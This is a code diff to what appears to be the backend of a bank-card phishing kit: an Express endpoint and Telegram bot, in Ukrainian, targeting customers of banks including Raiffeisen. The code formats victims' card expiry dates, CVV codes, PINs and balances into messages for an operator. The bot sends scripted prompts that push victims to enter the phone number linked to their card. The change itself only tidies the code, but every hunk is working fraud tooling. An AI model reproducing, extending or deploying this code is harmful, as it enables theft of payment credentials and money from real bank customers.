@@ -123,9 +123,7 @@ app.post('/api/submit', (req, res) => {
         if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
         if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
         message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
-        if (newData.balance) {
-            message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
-        }
+        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
         const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
         message += `<b>Кількість переходів:</b> ${visitText}\n`;
 
@@ -212,8 +210,7 @@ bot.on('callback_query', (callbackQuery) => {
                 commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
                 break;
             case 'request_details':
-                const sessionData = sessions.get(sessionId);
-                commandData = { isRaiffeisen: sessionData && sessionData.bankName === 'Райффайзен' };
+                commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === 'Райффайзен' };
                 break;
         }
 
